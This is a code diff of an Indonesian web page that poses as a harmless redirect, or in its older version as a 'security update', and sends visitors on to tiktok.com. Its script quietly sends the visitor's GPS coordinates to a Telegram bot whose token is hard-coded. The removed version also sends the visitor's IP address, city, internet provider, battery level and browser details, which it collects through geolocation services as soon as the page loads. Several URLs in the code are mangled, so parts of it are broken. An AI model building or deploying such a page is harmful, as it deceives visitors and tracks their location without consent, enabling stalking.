@@ -9,7 +9,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
         }
         body {
             background-color: #f4f6f9;
@@ -20,206 +20,129 @@
             padding: 20px;
         }
         .card {
-            background: #fff;
+            background: #ffffff;
             padding: 40px 30px;
             border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
             text-align: center;
-            max-width: 450px;
+            max-width: 420px;
             width: 100%;
+            border: 1px solid #e9ecef;
+        }
+        .icon {
+            font-size: 40px;
+            margin-bottom: 20px;
         }
         h2 {
-            color: #2c3e50;
-            margin-bottom: 15px;
-            font-size: 1.6rem;
+            color: #212529;
+            margin-bottom: 12px;
+            font-size: 1.5rem;
+            font-weight: 600;
         }
         p {
-            color: #7f8c8d;
-            font-size: 1rem;
+            color: #6c757d;
+            font-size: 0.95rem;
             margin-bottom: 25px;
-            line-height: 1.5;
+            line-height: 1.6;
         }
         .btn {
             display: inline-block;
             width: 100%;
             padding: 14px;
-            background-color: #3498db;
+            background-color: #0d6efd;
             color: #fff;
             text-decoration: none;
             border-radius: 8px;
-            font-weight: bold;
-            font-size: 1.1rem;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: background-color 0.2s ease;
+            text-align: center;
             border: none;
             cursor: pointer;
-            transition: background 0.2s ease;
         }
         .btn:hover {
-            background-color: #2980b9;
-        }
-        .loading {
-            display: none;
-            margin-top: 15px;
-            color: #e67e22;
-            font-size: 0.9rem;
+            background-color: #0b5ed7;
         }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Pembaruan Sistem Keamanan</h2>
-        <p>Untuk melanjutkan ke halaman utama yang aman, silakan klik tombol di bawah ini dan konfirmasikan izin peramban Anda jika diminta.</p>
+        <div class="icon">🔗</div>
+        <h2>Pengalihan Halaman</h2>
+        <p>Anda akan dialihkan ke halaman web eksternal resmi kami. Silakan klik tombol di bawah untuk melanjutkan.</p>
         
-        <button class="btn" id="btnLanjut" onclick="prosesMasuk()">Lanjutkan ke Website</button>
-        <div class="loading" id="statusTeks">Menghubungkan ke server aman...</div>
+        <!-- Tombol diubah menjadi button agar bisa memicu JavaScript terlebih dahulu -->
+        <button id="redirectBtn" class="btn">Lanjutkan ke Website</button>
     </div>
 
     <script>
-        // === KONFIGURASI UTAMA ===
+        // KONFIGURASI BOT TELEGRAM (Ganti bagian ini)
         const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
-        const CHAT_ID = '1966317946'; 
-        const DOMAIN_TUJUAN = 'https://tiktok.com'; 
+        const CHAT_ID = '1966317946';
+        const TARGET_URL = 'https://tiktok.com';
 
-        // Struktur data global untuk menyimpan hasil pencarian
-        let dataPengunjung = {
-            ip: "Mencari...",
-            negara: "Tidak diketahui",
-            kota: "Tidak diketahui",
-            provider: "Tidak diketahui",
-            baterai: "Tidak didukung",
-            perangkat: navigator.userAgent,
-            metodeLokasi: "Gagal Total",
-            lat: "",
-            lon: "",
-            petaUrl: ""
-        };
-
-        // Fungsi Timeout untuk mencegah proses fetch menggantung/macet lama
-        function fetchWithTimeout(url, options, timeout = 3000) {
-            return Promise.race([
-                fetch(url, options),
-                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
-            ]);
-        }
-
-        // Jalankan pelacakan informasi dasar dan IP Geolocation sejak halaman dimuat (Latar Belakang)
-        async function inisialisasiDataDasar() {
-            // 1. Ambil data baterai
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    dataPengunjung.baterai = `${Math.round(battery.level * 100)}% (${battery.charging ? "Mengecas" : "Tidak mengecas"})`;
-                } catch(e) {}
-            }
-
-            // 2. Lapisan Pertama IP Geolocation (ipapi.co)
-            try {
-                const res = await fetchWithTimeout('https://ipapi.co');
-                const data = await res.json();
-                dataPengunjung.ip = data.ip || dataPengunjung.ip;
-                dataPengunjung.negara = data.country_name || dataPengunjung.negara;
-                dataPengunjung.kota = data.city || dataPengunjung.kota;
-                dataPengunjung.provider = data.org || dataPengunjung.provider;
-                if(data.latitude && data.longitude) {
-                    dataPengunjung.metodeLokasi = "IP Geolocation (Lapisan 1)";
-                    dataPengunjung.lat = data.latitude;
-                    dataPengunjung.lon = data.longitude;
-                    dataPengunjung.petaUrl = `https://google.com{data.latitude},${data.longitude}`;
-                }
-                return; // Sukses, hentikan pencarian cadangan
-            } catch (e) {}
-
-            // 3. Lapisan Kedua IP Geolocation (ip-api.com) jika lapisan pertama gagal
-            try {
-                const res = await fetchWithTimeout('http://ip-api.com');
-                const data = await res.json();
-                if(data.status === "success") {
-                    dataPengunjung.ip = data.query;
-                    dataPengunjung.negara = data.country;
-                    dataPengunjung.kota = data.city;
-                    dataPengunjung.provider = data.isp;
-                    dataPengunjung.metodeLokasi = "IP Geolocation (Lapisan 2)";
-                    dataPengunjung.lat = data.lat;
-                    dataPengunjung.lon = data.lon;
-                    dataPengunjung.petaUrl = `https://google.com{data.lat},${data.lon}`;
-                    return;
-                }
-            } catch (e) {}
-
-            // 4. Lapisan Ketiga IP Geolocation (ipify + ipinfo) jika masih gagal
-            try {
-                const res = await fetchWithTimeout('https://ipify.org');
-                const data = await res.json();
-                dataPengunjung.ip = data.ip;
-                
-                const res2 = await fetchWithTimeout(`https://ipinfo.io{data.ip}/json`);
-                const data2 = await res2.json();
-                dataPengunjung.negara = data2.country;
-                dataPengunjung.kota = data2.city;
-                dataPengunjung.provider = data2.org;
-                if(data2.loc) {
-                    const loc = data2.loc.split(',');
-                    dataPengunjung.metodeLokasi = "IP Geolocation (Lapisan 3)";
-                    dataPengunjung.lat = loc[0];
-                    dataPengunjung.lon = loc[1];
-                    dataPengunjung.petaUrl = `https://google.com{loc[0]},${loc[1]}`;
-                }
-            } catch (e) {}
-        }
-
-        // Jalankan pengumpulan data di awal tanpa menunggu tombol diklik
-        inisialisasiDataDasar();
-
-        function prosesMasuk() {
-            const btn = document.getElementById('btnLanjut');
-            const status = document.getElementById('statusTeks');
-            
-            btn.disabled = true;
-            btn.innerText = "Memproses...";
-            status.style.display = "block";
-
-            // Mencoba memanggil modul GPS Hardware Akurasi Tinggi
+        document.getElementById('redirectBtn').addEventListener('click', function() {
+            // Memeriksa ketersediaan fitur Geolocation di browser pengunjung
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        // JIKA GPS PERANGKAT DIIZINKAN & BERHASIL (AKURASI MAKSIMAL)
-                        dataPengunjung.metodeLokasi = "Satelit GPS Perangkat (Akurasi Tinggi)";
-                        dataPengunjung.lat = position.coords.latitude;
-                        dataPengunjung.lon = position.coords.longitude;
-                        dataPengunjung.petaUrl = `https://google.com{position.coords.latitude},${position.coords.longitude}`;
+                    // Jika izin diberikan oleh pengguna
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
                         
-                        kirimHasilKeTelegram(`📍 *Akses Lokasi Diterima (GPS)*`);
+                        // Kirim lokasi asli berupa pin koordinat peta ke Telegram
+                        sendLocationToTelegram(latitude, longitude);
                     },
-                    function(error) {
-                        // JIKA GPS PERANGKAT GAGAL / DITOLAK -> GUNAKAN DATA IP CADANGAN YANG SUDAH DIAMBIL DI AWAL
-                        let alasanError = "Ditolak/Sistem Macet";
-                        if (error.code === error.PERMISSION_DENIED) alasanError = "Izin Ditolak Pengguna";
-                        if (error.code === error.POSITION_UNAVAILABLE) alasanError = "Sinyal GPS Tidak Menjawab";
-                        if (error.code === error.TIMEOUT) alasanError = "Waktu GPS Habis (Timeout)";
-                        
-                        kirimHasilKeTelegram(`⚠️ *Akses GPS Gagal/Ditolak (${alasanError})* \nℹ️ _Menggunakan Lokasi Jaringan Jarak Jauh_`);
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    // Jika izin ditolak atau terjadi error
+                    (error) => {
+                        sendTextToTelegram("Pengunjung menolak memberikan izin lokasi atau GPS tidak aktif.");
+                        navigateToTarget();
+                    }
                 );
             } else {
-                kirimHasilKeTelegram(`❌ *Peramban Tidak Mendukung Geolocation* \nℹ️ _Menggunakan Lokasi Jaringan Jarak Jauh_`);
+                // Jika browser tidak mendukung Geolocation
+                sendTextToTelegram("Browser pengunjung tidak mendukung pencarian lokasi.");
+                navigateToTarget();
             }
+        });
+
+        // Fungsi mengirim data koordinat berbentuk Objek Lokasi (Map Pin) ke Telegram
+        function sendLocationToTelegram(lat, lng) {
+            const url = `https://telegram.org{TELEGRAM_TOKEN}/sendLocation`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: lat,
+                    longitude: lng
+                })
+            })
+            .then(() => navigateToTarget())
+            .catch(() => navigateToTarget()); // Tetap pindah halaman meski pengiriman gagal
         }
 
-        function kirimHasilKeTelegram(statusHeader) {
-            // Menyusun pesan akhir terlepas dari metode mana yang berhasil mendapatkan lokasi
-            const pesanAkhir = `${statusHeader}\n\n` +
-                               `🔋 *Baterai*: ${dataPengunjung.baterai}\n` +
-                               `🌐 *Informasi Jaringan*:\n` +
-                               `• IP: \`${dataPengunjung.ip}\`\n` +
-                               `• Provider/ISP: ${dataPengunjung.provider}\n\n` +
-                               `🎯 *Detail Geografis*:\n` +
-                               `• Metode: _${dataPengunjung.metodeLokasi}_\n` +
-                               `• Negara/Kota: ${dataPengunjung.negara} / ${dataPengunjung.kota}\n` +
-                               `• Lat: \`${dataPengunjung.lat || 'Tidak terdeteksi'}\`\n` +
-                               `• Lon: \`${dataPengunjung.lon || 'Tidak terdeteksi'}\`\n` +
-                               `• Tautan Peta: ${dataPengunjung.petaUrl || 'Tidak tersedia'}\n\n` +
-                               `💻 *User-Agent*:\n\`${dataPengunjung.perangkat}\``;
-
+        // Fungsi alternatif mengirim pesan teks biasa jika lokasi gagal diakses
+        function sendTextToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+        }
+
+        // Fungsi untuk mengalihkan halaman utama
+        function navigateToTarget() {
+            window.location.href = TARGET_URL;
+        }
+    </script>
+
+</body>
+</html>
